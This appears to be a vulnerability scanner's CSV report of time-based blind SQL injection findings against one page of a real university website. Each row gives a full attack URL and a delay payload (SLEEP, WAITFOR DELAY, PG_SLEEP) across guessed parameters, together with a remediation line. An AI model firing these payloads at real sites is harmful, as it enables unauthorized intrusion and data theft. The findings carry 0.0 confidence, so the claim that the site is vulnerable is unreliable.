Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1+OR+SLEEP%285%29#1767331041949-5d391444-1a4a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1+OR+SLEEP%285%29#1767331041949-5d391444-1a4a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=SLEEP%285%29%23#1767331041949-5d391444-1a4a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=SLEEP%285%29%23#1767331041949-5d391444-1a4a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1+OR+SLEEP%285%29#1767331041949-5d391444-1a4a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1+OR+SLEEP%285%29#1767331041949-5d391444-1a4a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+AND+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%22+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%22+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=SLEEP%285%29%23#1767331041949-5d391444-1a4a),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%22+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%22+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%22+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%22+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%22+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1767331041949-5d391444-1a4a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1767331041949-5d391444-1a4a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1767331041949-5d391444-1a4a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1767331041949-5d391444-1a4a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1767331041949-5d391444-1a4a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1767331041949-5d391444-1a4a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1767331041949-5d391444-1a4a),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1+OR+SLEEP%285%29#1767331041949-5d391444-1a4a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1+OR+SLEEP%285%29#1767331041949-5d391444-1a4a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+AND+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+AND+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1+OR+SLEEP%285%29#1767331041949-5d391444-1a4a),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+AND+PG_SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+AND+SLEEP%285%29--#1767331041949-5d391444-1a4a),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1767331041949-5d391444-1a4a),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=SLEEP%285%29%23#1764844103047-93059006-04ad),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=SLEEP%285%29%23#1764844103047-93059006-04ad),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1+OR+SLEEP%285%29#1764844103047-93059006-04ad),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27+AND+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%27+AND+SLEEP%285%29--#1764844103047-93059006-04ad),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1+OR+SLEEP%285%29#1764844103047-93059006-04ad),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%22+AND+SLEEP%285%29--#1764844103047-93059006-04ad),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1+OR+SLEEP%285%29#1764844103047-93059006-04ad),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1764844103047-93059006-04ad),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?search=1%22+AND+SLEEP%285%29--#1764844103047-93059006-04ad),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%22+AND+SLEEP%285%29--#1764844103047-93059006-04ad),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%22+AND+SLEEP%285%29--#1764844103047-93059006-04ad),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%22+AND+SLEEP%285%29--#1764844103047-93059006-04ad),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?query=1%22+AND+SLEEP%285%29--#1764844103047-93059006-04ad),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?page=1%27+AND+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%22+AND+SLEEP%285%29--#1764844103047-93059006-04ad),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=SLEEP%285%29%23#1764844103047-93059006-04ad),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1+OR+SLEEP%285%29#1764844103047-93059006-04ad),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=SLEEP%285%29%23#1764844103047-93059006-04ad),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1764844103047-93059006-04ad),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?cmd=1%27+AND+SLEEP%285%29--#1764844103047-93059006-04ad),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?id=SLEEP%285%29%23#1764844103047-93059006-04ad),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-biotechnology/?file=1%27+AND+SLEEP%285%29--#1764844103047-93059006-04ad),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
